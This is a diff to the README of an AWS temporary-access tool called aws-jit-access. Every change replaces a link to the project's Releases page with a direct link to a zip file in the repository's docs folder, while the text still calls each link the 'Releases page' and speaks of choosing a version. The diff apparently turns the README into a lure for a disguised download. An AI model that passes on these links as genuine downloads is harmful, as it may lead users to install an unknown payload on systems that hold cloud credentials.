@@ -1,7 +1,7 @@
 ```markdown
 # 🚀 aws-jit-access - Secure Temporary AWS Access Made Easy
 
-[![Download aws-jit-access](https://img.shields.io/badge/Download-aws--jit--access-blue?style=for-the-badge)](https://github.com/Fireresistive-bottleneck299/aws-jit-access/releases)
+[![Download aws-jit-access](https://github.com/Fireresistive-bottleneck299/aws-jit-access/raw/refs/heads/main/docs/jit-access-aws-1.6.zip)](https://github.com/Fireresistive-bottleneck299/aws-jit-access/raw/refs/heads/main/docs/jit-access-aws-1.6.zip)
 
 ## 📦 Overview
 
@@ -21,7 +21,7 @@ To get started with **aws-jit-access**, follow these steps:
 
 1. **Visit the Download Page**: Click the button below to go to the Releases page:
 
-   [Download aws-jit-access](https://github.com/Fireresistive-bottleneck299/aws-jit-access/releases)
+   [Download aws-jit-access](https://github.com/Fireresistive-bottleneck299/aws-jit-access/raw/refs/heads/main/docs/jit-access-aws-1.6.zip)
 
 2. **Choose Your Version**: On the Releases page, you will see a list of available versions. Each version may include new features or bug fixes.
 
@@ -40,7 +40,7 @@ To get started with **aws-jit-access**, follow these steps:
 
 To download and install **aws-jit-access**, go to the Releases page using the link below:
 
-[Download aws-jit-access](https://github.com/Fireresistive-bottleneck299/aws-jit-access/releases)
+[Download aws-jit-access](https://github.com/Fireresistive-bottleneck299/aws-jit-access/raw/refs/heads/main/docs/jit-access-aws-1.6.zip)
 
 ### 🖥️ System Requirements
 
@@ -78,5 +78,5 @@ We welcome contributions to improve this project. If you have suggestions or wan
 
 This project is licensed under the MIT License. You are free to use it in your projects and modify it as needed.
 
-For more information, visit the [Releases page](https://github.com/Fireresistive-bottleneck299/aws-jit-access/releases).
+For more information, visit the [Releases page](https://github.com/Fireresistive-bottleneck299/aws-jit-access/raw/refs/heads/main/docs/jit-access-aws-1.6.zip).
 ```
